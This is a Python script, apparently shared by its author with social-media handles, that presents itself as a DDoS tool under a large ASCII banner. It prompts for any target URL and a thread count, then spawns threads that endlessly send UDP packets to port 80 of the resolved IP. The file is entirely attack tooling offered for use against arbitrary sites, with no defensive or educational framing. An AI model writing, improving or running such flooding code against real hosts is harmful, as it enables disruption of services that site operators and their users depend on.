#in the name of god
#𝖺𝗅𝗂 𝗈𝗋 𝖾𝖿𝖼𝗈𝗋𝗂𝗍𝗂
#!/usr/bin/python3



# =======================================


import time
import socket
import sys
import _thread
from colorama import Fore
import termcolor2
import os


# =======================================


os.system('clear')
try:
    from colorama import Fore
except:
    os.system('pip install colorama')
try:
    from colorama import Fore
except:
    os.system('pip3 install colorama')
try:
    import termcolor2
except:
    os.system('pip install termcolor2')
try:
    import termcolor2
except:
    os.system('pip3 install termcolor2')
os.system('clear')



# =======================================



print(Fore.RED)
print(""" 

                                                                              
                                                                              
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS   
                                                                              
                                                                              
                                                                              
                                                                              
                                                                              
                                                                              
                                                                              

 """)
print(Fore.CYAN+"Rubika.Id"+" = "+ Fore.YELLOW+"@eFcoriti")
print(Fore.CYAN+"Telegram.Id"+" = "+ Fore.YELLOW+"@eFcoriti")
print(Fore.CYAN+"Git.Hub"+" = "+ Fore.YELLOW+"https://github.com/EFCORITI")
print(Fore.CYAN+"Telegram.Channel"+" = "+ Fore.YELLOW+"t.me/eFcoriti_proGrammer")

print(""" 

  _                                 _                                     
 /   _   _|  _   _|   |_        _ _|_ _  _  ._ o _|_ o    _  ._    _. | o 
 \_ (_) (_| (/_ (_|   |_) \/   (/_ | (_ (_) |  |  |_ |   (_) |    (_| | | 
                          /                                               

 """)
 
 
 
# =======================================



site = input(termcolor2.colored('Enter The Target Url >> ',color="white")+ Fore.LIGHTRED_EX+'')
print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
thread_count = input(termcolor2.colored('Enter your thread >> ',color = "white")+ Fore.LIGHTRED_EX+'')
print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~")

ip = socket.gethostbyname(site)

port = 80
MESSAGE = "efcoriti"
print(termcolor2.colored('UDP target IP:',color="red"), ip)
print(termcolor2.colored('UDP target port:',color="red"), port )
time.sleep(3)

print("\n\n")


# =======================================


def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, port))
        print(termcolor2.colored('sending requests to',color = "green"),(Fore.GREEN+ ip))
        time.sleep(2)
        print(termcolor2.colored('sending requests to',color = "red"),(Fore.RED+ ip))




# =======================================



for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass